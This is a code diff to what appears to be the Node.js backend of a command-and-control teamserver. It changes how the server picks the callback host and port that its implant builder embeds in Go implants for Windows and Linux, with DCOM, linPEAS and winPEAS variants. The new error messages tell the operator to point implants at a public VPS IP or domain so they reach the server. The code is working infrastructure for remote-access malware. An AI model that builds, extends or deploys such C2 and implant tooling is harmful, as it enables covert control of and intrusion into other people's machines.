@@ -1555,7 +1555,7 @@ function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
   let tcpP = normalizeTcpListenPort(rawTcpPort);
   if (tcpP === httpP) {
     console.warn(
-      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 2026 for Go implant TCP. Fix .env: TCP_PORT=2026`
+      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Implant TCP will listen on 2026 instead. Set BUILD_C2_PORT=2026 (or PORT≠TCP_PORT).`
     );
     tcpP = 2026;
   }
@@ -1565,6 +1565,55 @@ function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
     );
   }
   return tcpP;
+}
+
+function parseHostFromUrlish(value) {
+  const s = String(value || '').trim();
+  if (!s) return '';
+  try {
+    const u = new URL(s.includes('://') ? s : `https://${s}`);
+    const h = u.hostname;
+    if (h && h !== '0.0.0.0') return h;
+  } catch (_) {
+    /* plain hostname */
+  }
+  const plain = s.replace(/^https?:\/\//i, '').split('/')[0].split(':')[0].trim();
+  return plain || '';
+}
+
+/** Host embedded in implants from dashboard / BUILD_C2_* */
+function resolveBuildC2Host(req) {
+  const envHost = String(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '').trim();
+  if (envHost) return envHost;
+  const corsHost = parseHostFromUrlish((process.env.CORS_ORIGIN || '').split(',')[0]);
+  if (corsHost && corsHost !== 'localhost' && corsHost !== '127.0.0.1') return corsHost;
+  const appEnv = process.env.APP_ENV || 'local';
+  if (appEnv === 'local') return '127.0.0.1';
+  const reqHost = req && req.hostname ? String(req.hostname).trim() : '';
+  if (reqHost && reqHost !== 'localhost' && reqHost !== '127.0.0.1') return reqHost;
+  return '';
+}
+
+function getImplantListenPort(settings) {
+  const httpPort = Number(process.env.PORT || 5000);
+  const raw = Number(
+    process.env.TCP_PORT ||
+    (settings && settings.serverPort) ||
+    2026
+  );
+  return resolveImplantTcpPort(raw, httpPort);
+}
+
+/** Port embedded in new implants — always the port the TCP listener actually uses */
+function resolveBuildC2Port(settings) {
+  const listen = getImplantListenPort(settings);
+  const explicit = Number(process.env.BUILD_C2_PORT);
+  if (Number.isFinite(explicit) && explicit > 0 && explicit < 65536 && explicit !== listen) {
+    console.warn(
+      `[C2] BUILD_C2_PORT=${explicit} ignored — implant listener is on ${listen}. Open firewall for ${listen} and rebuild implants.`
+    );
+  }
+  return listen;
 }
 
 function startTcpServer(host, portRaw) {
@@ -1620,8 +1669,17 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
     ensureDefaultSettings();
     const s = getAllSettings();
     const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
-    const httpPort = Number(process.env.PORT || 5000);
-    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 2026, httpPort);
+    const tcpPort = getImplantListenPort(s);
+    if (process.env.TCP_PORT) {
+      setSettings({ serverPort: tcpPort });
+    }
+    const embedHost = resolveBuildC2Host();
+    const embedPort = resolveBuildC2Port(s);
+    console.log(`[C2] Implant TCP bind ${tcpHost}:${tcpPort}`);
+    console.log(`[C2] Builder embed target ${embedHost || '(unset — set BUILD_C2_HOST)'}:${embedPort}`);
+    if (!embedHost && (process.env.APP_ENV || 'local') !== 'local') {
+      console.warn('[C2] BUILD_C2_HOST unset in production — set your VPS IP/domain or implants will not reach this server.');
+    }
     try {
       await startTcpServer(tcpHost, tcpPort);
     } catch (e) {
@@ -2271,7 +2329,7 @@ app.put('/api/settings', async (req, res) => {
   // Hot-restart TCP server if host/port changed
   const s = getAllSettings();
   try {
-    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
+    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', getImplantListenPort(s));
     res.json({ ok: true });
   } catch (e) {
     console.error('Failed to restart TCP server:', e.message);
@@ -2695,16 +2753,9 @@ app.get('/api/builder/defaults', requireAuth, (req, res) => {
   try {
     const settings = getAllSettings();
     const appEnv = process.env.APP_ENV || 'local';
-    const defaultHost =
-      process.env.BUILD_C2_HOST ||
-      (appEnv === 'local' ? '127.0.0.1' : '') ||
-      '';
-    const defaultPort = Number(
-      process.env.BUILD_C2_PORT ||
-      process.env.TCP_PORT ||
-      settings.serverPort ||
-      (appEnv === 'local' ? 2026 : 443)
-    );
+    const defaultHost = resolveBuildC2Host(req);
+    const defaultPort = resolveBuildC2Port(settings);
+    const implantListenPort = getImplantListenPort(settings);
     let linpeasAvailable = false;
     let linpeasHint = '';
     let linpeasAutoFetch = true;
@@ -2719,6 +2770,7 @@ app.get('/api/builder/defaults', requireAuth, (req, res) => {
       appEnv,
       host: defaultHost,
       port: defaultPort,
+      implantListenPort,
       platforms: ['windows', 'linux'],
       arches: ['amd64', '386', 'arm64'],
       signing: implantBuilder.getSigningStatus(),
@@ -2806,25 +2858,27 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
     const arch = String(body.arch || 'amd64').toLowerCase();
     const settings = getAllSettings();
     const appEnv = process.env.APP_ENV || 'local';
-    const host = String(
-      body.host ||
-      process.env.BUILD_C2_HOST ||
-      (appEnv === 'local' ? '127.0.0.1' : '') ||
-      ''
-    ).trim();
     const variant = String(body.variant || 'implant').toLowerCase();
     const isDcom = platform === 'windows' && variant === 'dcom';
     const isLinpeas = platform === 'linux' && variant === 'linpeas';
     const isWinpeas = platform === 'windows' && variant === 'winpeas';
-    const port = Number(
-      body.port ||
-      process.env.BUILD_C2_PORT ||
-      process.env.TCP_PORT ||
-      settings.serverPort ||
-      (appEnv === 'local' ? 2026 : 443)
-    );
+    const host = String(
+      body.host ||
+      resolveBuildC2Host(req) ||
+      ''
+    ).trim();
+    const port = Number(body.port || resolveBuildC2Port(settings));
     if (!host && !isDcom && !isLinpeas && !isWinpeas) {
-      return res.status(400).json({ error: 'C2 host is required' });
+      return res.status(400).json({
+        error:
+          'C2 host is required. Set BUILD_C2_HOST (or PUBLIC_C2_HOST) in .env.production to your VPS IP/domain, restart Node, rebuild the implant.',
+      });
+    }
+    if (host === '127.0.0.1' && appEnv !== 'local' && !isDcom && !isLinpeas && !isWinpeas) {
+      return res.status(400).json({
+        error:
+          'C2 host is 127.0.0.1 — that only works on the teamserver itself. Set BUILD_C2_HOST to your public IP/domain.',
+      });
     }
     console.log(
       `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${isLinpeas ? '/linpeas' : ''}${isWinpeas ? '/winpeas' : ''}${host ? ` -> ${host}:${port}` : ''}`
